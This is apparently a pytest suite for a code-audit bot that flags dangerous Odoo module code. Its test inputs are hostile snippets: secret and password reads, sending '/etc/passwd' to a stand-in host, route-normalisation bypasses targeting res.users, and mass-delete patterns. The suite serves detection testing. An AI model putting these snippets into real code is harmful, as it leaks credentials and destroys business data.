"""CODE-AUDIT-14: REVIEW-CODE-AUDIT-11 (5H/4M/2L). Rule: a sink is safe only when provably bounded
and non-sensitive; anything unprovable is HIGH. Each finding: review probe, neighbours, benign twin."""
import pytest

from tests.test_nf_bot_code_audit_11 import _m, _sev, _js, P, O

CH = "from odoo import http\nfrom odoo.http import request\nimport os\nfrom odoo.tools import config\n\n\nclass C(http.Controller):\n"


def _ctl(body, auth="public"):
    return {"controllers/c.py": CH + f"    @http.route('/p', auth='{auth}', type='http')\n    def p(self, **kw):\n"
            + "".join("        " + ln + "\n" for ln in body.split("\n"))}


# ---------------------------------------------------------------- H1 secret sources
@pytest.mark.parametrize("body", [
    "k = 'database.' + 'secret'\nreturn request.env['ir.config_parameter'].sudo().get_param(k)",  # review probes
    "return request.env['ir.config_parameter'].sudo().get_param(kw.get('k'))",
    "return config['admin_passwd']",
    "return config.get('db_password')",
    "return os.environ.get('ODOO_DB_PASSWORD', '')",
    "return request.session.sid",
    "v = os.environ['X_' + kw.get('n', '')]\nreturn v",  # neighbours
    "t = request.session.session_token\nreturn {'t': t}",
    "x = os.getenv(kw['k'])\nreturn x or ''",
    "request.env['ir.config_parameter'].sudo().get_param(kw['k'])\nreturn 'ok'",
])
def test_h1_route_secret_high(body):
    assert "high" in _sev(_ctl(body), "route-secret-read")


def test_h1_authenticated_route_returning_secret_high():
    assert "high" in _sev(_ctl("return config['admin_passwd']", auth="user"), "route-secret-read")


@pytest.mark.parametrize("body", [
    "pw = config['admin_passwd']\nself.env['mail.mail'].create({'body_html': pw, 'email_to': 'a@b'})",
    "self.env['mail.mail'].create({'body_html': os.environ.get('ODOO_DB_PASSWORD')})",
    "import requests\nrequests.post('http://e', data={'k': config.get('db_password')})",
    "_logger.info('pw %s', config['admin_passwd'])",
    "k = self.env['ir.config_parameter'].sudo().get_param(self.name)\nself.message_post(body=k)",
])
def test_h1_secret_exfiltration_high(body):
    pre = "import os, logging\nfrom odoo.tools import config\n_logger = logging.getLogger(__name__)\n"
    assert "high" in _sev(_m(body, pre), "secret-exfiltration")


@pytest.mark.parametrize("body", [
    "return request.env['ir.config_parameter'].sudo().get_param('website.cookie_bar') or ''",
    "return os.environ.get('TZ', '')",
    "return config.get('addons_path', '')",
])
def test_h1_non_secret_constant_silent(body):
    assert "high" not in _sev(_ctl(body), "route-secret-read")


# ---------------------------------------------------------------- H2 raw SQL from routes / feeding mass changes
@pytest.mark.parametrize("body,auth", [
    ("request.env.cr.execute('select password from res_users')\nreturn str(request.env.cr.fetchall())", "none"),  # probe
    ("request.env.cr.execute('select login, password from res_users')\nreturn str(request.env.cr.fetchall())", "public"),
    ("request.env.cr.execute('SELECT value FROM ir_config_parameter')\nreturn 'x'", "user"),
    ("request.env.cr.execute('select key from res_users_apikeys')\nreturn 'x'", "public"),
    ("request.env.cr.execute('select name from res_partner')\nreturn str(request.env.cr.fetchall())", "public"),
    ("request.env.cr.execute('select name from res_partner')\nr = request.env.cr.dictfetchall()\nreturn str(r)", "none"),
])
def test_h2_route_sql_high(body, auth):
    assert "high" in _sev(_ctl(body, auth), "route-sql-secret")


@pytest.mark.parametrize("body", [
    "self.env.cr.execute('select id from res_partner')\nself.env['res.partner'].browse([r[0] for r in self.env.cr.fetchall()]).unlink()",  # probe
    "self.env.cr.execute('select id from res_partner')\nids = [r[0] for r in self.env.cr.fetchall()]\nself.env['res.partner'].browse(ids).write({'active': False})",
    "self._cr.execute('select id from res_partner where active')\nrows = self._cr.dictfetchall()\nself.env['res.partner'].browse([r['id'] for r in rows]).unlink()",
])
def test_h2_sql_ids_mass_change(body):
    assert "high" in _sev(_m(body), "mass-change")


def test_h2_bounded_sql_silent():
    body = "self.env.cr.execute('select id from res_partner where id = %s', [self.id])\nself.env['res.partner'].browse([r[0] for r in self.env.cr.fetchall()]).unlink()"
    assert "high" not in _sev(_m(body), "mass-change")
    pub = "request.env.cr.execute('select name from res_partner limit 5')\nreturn str(request.env.cr.fetchall())"
    assert "high" not in _sev(_ctl(pub), "route-sql-secret")


def test_h1_named_key_logged_high_but_sent_to_its_api_ok():
    pre = "import logging, requests\n_logger = logging.getLogger(__name__)\n"
    k = "k = self.env['ir.config_parameter'].sudo().get_param('x.api_key')\n"
    assert "high" in _sev(_m(k + "_logger.info('k %s', k)", pre), "secret-exfiltration")
    assert "high" not in _sev(_m(k + "requests.get('https://api.x', params={'key': k})", pre), "secret-exfiltration")


# ---------------------------------------------------------------- H3 uniqueness per (model, field); collected id lists
_UQ = "    _sql_constraints = [('n_uniq', 'unique(name)', 'x'), ('c_uniq', 'unique(code)', 'x')]\n    name = fields.Char()\n    code = fields.Char()\n"


def _mu(body):
    f = _m(body)
    f["models/a.py"] = f["models/a.py"].replace("    _description = 'a'\n", "    _description = 'a'\n" + _UQ, 1)
    return f


@pytest.mark.parametrize("body", [
    f"{P}.search([('name', '=', self.name)]).unlink()",  # probe: unique(name) is on a.a, not res.partner
    f"{P}.search([('code', '=', self.code)]).unlink()",
    f"{P}.search([('id', 'in', [g['id'] for g in {P}.search_read([], ['id'])])]).unlink()",  # probe
    f"{P}.search([('id', 'in', list(map(lambda g: g['id'], {P}.search_read([], ['id']))))]).unlink()",
    f"{P}.search([('id', 'in', [r.id for r in {P}.search([])])]).write({{'active': False}})",
    f"{P}.search([('id', 'in', {P}.search([]).mapped('id'))]).unlink()",
    f"{P}.search([('id', 'in', [r['id'] for r in {P}.read_group([], ['id'], ['id'])])]).unlink()",
])
def test_h3_mass_change_high(body):
    assert "high" in _sev(_mu(body), "mass-change")


@pytest.mark.parametrize("body", [
    "self.env['a.a'].search([('name', '=', self.name)]).unlink()",  # unique on its own model
    f"{P}.search([('id', 'in', [r.id for r in self])]).unlink()",
    f"{P}.search([('id', 'in', [g['id'] for g in {P}.search_read([('id', '=', 1)], ['id'])])]).unlink()",
])
def test_h3_bounded_silent(body):
    assert "high" not in _sev(_mu(body), "mass-change")


# ---------------------------------------------------------------- H4 route normalisation, call_button, JSON-2 parity
@pytest.mark.parametrize("src", [
    "fetch('/json/2/res.users/%77rite',{method:'POST'});",  # probes
    "fetch('/web/dataset/call_kw/res.%75sers/write',{method:'POST'});",
    "fetch('/web/dataset/./call_kw/res.users/write',{method:'POST'});",
    "fetch('/web/x/../dataset/call_kw/res.users/write',{method:'POST'});",
    "fetch('/web\\\\dataset\\\\call_kw/res.users/write',{method:'POST'});",
    "fetch('/web/dataset/call_button/res.users/action_reset_password',{method:'POST'});",
    "fetch(new URL('call_kw/res.users/write', location.origin+'/web/dataset/'),{method:'POST'});",
    "fetch(new URL('../call_kw/res.users/write', location.origin+'/web/dataset/x/'),{method:'POST'});",
    "const u=new URL('/web/dataset/call_kw/res.partner/read',location.origin); u.pathname=u.pathname.replace('partner/read','users/write'); fetch(u,{method:'POST'});",
    "fetch('/web/dataset/call_kw%2Fres.users%2Fwrite',{method:'POST'});",  # neighbours
    "fetch('/web//dataset//call_kw/res.users/unlink',{method:'POST'});",
    "fetch('/json/2/res.users/write/.',{method:'POST'});",
    "fetch('/web/dataset/call_button',{method:'POST',body:JSON.stringify({params:{model:'res.users',method:'action_reset_password',args:[[1]]}})});",
])
def test_h4_normalised_route_sensitive_high(src):
    assert "high" in _sev(_js(src), "js-sensitive-model")


@pytest.mark.parametrize("src", [
    "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({domain:[]})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});",  # probe
    "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});",
])
def test_h4_json2_search_unlink_mass(src):
    assert "high" in _sev(_js(src), "js-mass-change")


def test_h4_benign_routes_silent():
    for src in ("fetch('/web/image/res.partner/1/avatar_128');",
                "fetch('/web/dataset/call_kw/res.partner/read',{method:'POST',body:JSON.stringify({params:{args:[[1]]}})});"):
        assert "high" not in _sev(_js(src), "js-sensitive-model")
    j2 = "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({domain:[['id','=',1]]})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});"
    assert "high" not in _sev(_js(j2), "js-mass-change")


# ---------------------------------------------------------------- H5 view-state domain laundering
_DEL5 = "await this.orm.unlink('res.partner', await this.orm.search('res.partner', {d}));"


def _comp5(body, d="this.state.domain"):
    return ("class C extends Component {\n setup(){ this.state = useState({domain: [['id','=',1]]}); }\n"
            "onSearch(d){ this.state.domain = d; }\n" + body + "\n async go(){ " + _DEL5.format(d=d) + " }\n}")


@pytest.mark.parametrize("body,d", [
    ("wipe(){ const s = this.state; const t = s; t.domain = []; }", "this.state.domain"),  # probes
    ("wipe(){ const d = this.state.domain; d.splice(0); }", "this.state.domain"),
    ("wipe(){ Reflect.set(this.state, 'domain', []); }", "this.state.domain"),
    ("wipe(){ this.state['domain'] = []; }", "this.state.domain"),
    ("wipe(){ const k = 'domain'; this.state[k] = []; }", "this.state.domain"),
    ("wipe(){ const {domain} = this.state; domain.length = 0; }", "this.state.domain"),
    ("wipe(){ }", "(() => { const d = [...this.state.domain]; d.length = 0; return d; })()"),
    ("wipe(){ const s = this; const t = s.state; const u = t; u.domain = []; }", "this.state.domain"),  # neighbours
    ("wipe(){ const {domain: dd} = this.state; dd.push('|', ['id','!=',0]); }", "this.state.domain"),
    ("wipe(k){ this.state[k] = []; }", "this.state.domain"),
    ("wipe(k){ Reflect.set(this.state, k, []); }", "this.state.domain"),
    ("wipe(){ Reflect.set(this.state.domain, 'length', 0); }", "this.state.domain"),
    ("wipe(){ const s = this.state; s['domain'].splice(0); }", "this.state.domain"),
    ("wipe(){ Reflect.deleteProperty(this.state, 'domain'); }", "this.state.domain"),
])
def test_h5_laundered_state_domain_high(body, d):
    assert "high" in _sev(_js(_comp5(body, d)), "js-mass-change")


@pytest.mark.parametrize("body", [
    "",  # twins: user selection only / other keys
    "wipe(){ const s = this.state; s.other = []; }",
    "wipe(){ this.state['limit'] = 5; }",
    "wipe(){ Reflect.set(this.state, 'limit', 5); }",
    "wipe(){ const {domain} = this.state; console.log(domain.length); }",
])
def test_h5_benign_twins_silent(body):
    assert "high" not in _sev(_js(_comp5(body)), "js-mass-change")


# ---------------------------------------------------------------- M1 QWeb t-foreach / t-call aliases of session
def _qt(body):
    return {"report/r.xml": f"<odoo><template id='r'>{body}</template></odoo>"}


@pytest.mark.parametrize("body", [
    "<t t-foreach='[request.session]' t-as='s'><t t-esc='s.clear()'/></t>",  # probes
    "<t t-call='x.u'><t t-set='s' t-value='request.session'/></t>",
    "<t t-foreach='[request.session]' t-as='s'><t t-esc=\"s_value.pop('uid')\"/></t>",  # neighbours
    "<t t-foreach='[request.env.context]' t-as='c'><t t-set='d' t-value='c'/><t t-esc=\"d.pop('lang')\"/></t>",
    "<t t-foreach='{1: request.session}.values()' t-as='s'><t t-esc='s.popitem()'/></t>",
    "<t t-call='x.u'><t t-set='e' t-value='request.env'/></t>",
])
def test_m1_qweb_session_alias_high(body):
    assert "high" in _sev(_qt(body), "unsafe-expression")


@pytest.mark.parametrize("body", [
    "<t t-foreach='[1, 2]' t-as='s'><t t-esc='s'/></t>",
    "<t t-foreach='docs' t-as='o'><t t-esc='o.name'/></t>",
    "<t t-call='x.u'><t t-set='title' t-value=\"'Hi'\"/></t>",
    "<t t-call='x.u'><t t-set='nm' t-value='doc.name'/></t>",
])
def test_m1_benign_twins_silent(body):
    assert "high" not in _sev(_qt(body), "unsafe-expression")


# ---------------------------------------------------------------- M2 runtime model / runtime ids
@pytest.mark.parametrize("src,rule", [
    ("fetch('/web/dataset/call_kw',{method:'POST',body:JSON.stringify({params:{model:window.m,method:'unlink',args:[[1]]}})});", "js-sensitive-model"),  # probes
    ("fetch('/web/dataset/call_kw/res.partner/unlink',{method:'POST',body:JSON.stringify({params:{args:[window.ids]}})});", "js-mass-change"),
    ("fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids: window.ids})});", "js-mass-change"),
    ("class C extends Component { async go(){ await this.orm.unlink('res.partner', JSON.parse(localStorage.getItem('ids'))); } }", "js-mass-change"),  # neighbours
    ("class C extends Component { async go(){ const r = await (await fetch('/x')).json(); await this.orm.write('res.partner', r, {active:false}); } }", "js-mass-change"),
    ("class C extends Component { async go(){ await this.orm.unlink(window.model, [1]); } }", "js-sensitive-model"),
    ("rpc('/web/dataset/call_kw/res.partner/unlink', {model:'res.partner', method:'unlink', args:[window.ids]});", "js-mass-change"),
])
def test_m2_runtime_model_or_ids_high(src, rule):
    assert "high" in _sev(_js(src), rule)


@pytest.mark.parametrize("src", [
    "class C extends Component { async go(){ await this.orm.unlink('res.partner', this.props.resIds); } }",
    "class C extends Component { async go(){ await this.orm.unlink('res.partner', [1, 2]); } }",
    "class C extends Component { async go(){ await this.orm.unlink(this.props.resModel, [this.props.resId]); } }",
])
def test_m2_selection_twins_silent(src):
    f = _js(src)
    assert "high" not in _sev(f, "js-mass-change") and "high" not in _sev(f, "js-sensitive-model")


@pytest.mark.parametrize("body", [
    "self.env['res.partner'].browse(self.env.context.get('ids')).unlink()",  # probe
    "self.env['res.partner'].search([('id','in',self.env.context.get('ids',[]))]).unlink()",
    "self.env['res.partner'].browse(self._context['partner_ids']).write({'active': False})",
])
def test_m2_python_ctx_ids_high(body):
    assert "high" in _sev(_mu(body), "mass-change")


@pytest.mark.parametrize("body", [
    "self.env['res.partner'].browse(self.env.context.get('active_ids')).unlink()",
    "self.env['res.partner'].search([('id','in',self.env.context.get('active_ids',[]))]).unlink()",
])
def test_m2_python_active_ids_silent(body):
    assert "high" not in _sev(_mu(body), "mass-change")


# ---------------------------------------------------------------- M3 XML <function> search on m2o = ref() is bounded
def _xf(search, fn="write"):
    return {"data/d.xml": f"<odoo><function model='project.task' name='{fn}'><value model='project.task' search=\"{search}\"/>"
            "<value eval=\"{'priority': '1'}\"/></function></odoo>"}


@pytest.mark.parametrize("search", [
    "[('project_id','=',ref('project.project_1')),('user_ids','in',ref('base.user_admin'))]",  # review probe shape
    "[('project_id','=',ref('project.project_1'))]",
    "[('project_id','=',obj().env.ref('project.project_1').id)]",
])
def test_m3_ref_match_bounded(search):
    assert "high" not in _sev(_xf(search), "xml-function-destructive")


@pytest.mark.parametrize("search", [
    "[('project_id','!=',ref('project.project_1'))]",
    "[('active','=',True)]",
    "[]",
    "[('project_id','=',ref(xid))]",
])
def test_m3_unbounded_search_still_high(search):
    assert "high" in _sev(_xf(search), "xml-function-destructive")


# ---------------------------------------------------------------- M4 network egress of file / bulk data, runtime host
_NETPRE = "import requests\nimport urllib.request\nimport http.client\n"


@pytest.mark.parametrize("body", [
    "requests.post('http://e', data=open('/etc/passwd').read())",  # probe
    "with open('/etc/passwd') as fh:\n    requests.post('http://e', data=fh.read())",
    "d = open('/tmp/x').read()\nrequests.put('https://e/x', json={'d': d})",
    f"rows = {P}.search_read([], ['email'])\nrequests.post('https://e/x', json=rows)",
    "self.env.cr.execute('select 1')\nrequests.post('https://e/x', data=str(self.env.cr.fetchall()))",
    "urllib.request.urlopen('http://e', data=open('/etc/passwd','rb').read())",
])
def test_m4_exfiltration_high(body):
    assert "high" in _sev(_m(body, _NETPRE), "network-exfiltration")


@pytest.mark.parametrize("body", [
    "requests.get(self.url)",
    "http.client.HTTPSConnection(self.host).request('GET', '/')",
    "requests.post(self.env.context.get('u'), json={})",
])
def test_m4_runtime_host_medium(body):
    assert "medium" in _sev(_m(body, _NETPRE), "outbound-network")


@pytest.mark.parametrize("body", [
    "requests.post('https://api.example.com/v1', json={'name': self.name})",
    "requests.get(self.env['ir.config_parameter'].sudo().get_param('x.endpoint') + '/ping')",
    "requests.get(f'https://api.example.com/v1/{self.id}')",
])
def test_m4_benign_twins(body):
    f = _m(body, _NETPRE)
    assert not _sev(f, "network-exfiltration") and "medium" not in _sev(f, "outbound-network")


# ---------------------------------------------------------------- L2 pinned vendored libs
_VSRC = "function f(u, b) { const x = new XMLHttpRequest(); x.open('POST', u); x.send(b); }\n"


def _vfiles(src):
    return _js(src)


def test_l2_vendored_exact_copy_downgraded(monkeypatch):
    import hashlib
    from app.bots import code_audit as ca
    text = _vfiles(_VSRC)["static/src/a.js"]
    assert "high" in _sev(_vfiles(_VSRC), "js-sensitive-model")
    monkeypatch.setattr(ca, "_VENDORED", {hashlib.sha256(text.encode()).hexdigest(): "test-lib"})
    assert _sev(_vfiles(_VSRC), "js-sensitive-model") == {"medium"}
    # one changed byte breaks the pin: HIGH again
    assert "high" in _sev(_vfiles(_VSRC + " "), "js-sensitive-model")


def test_l2_pin_file_is_hashes_only():
    import json
    from pathlib import Path
    from app.bots import code_audit as ca
    d = json.loads(Path(ca.__file__).with_name("code_audit_vendored.json").read_text())
    assert d and all(len(k) == 64 and int(k, 16) >= 0 for k in d)
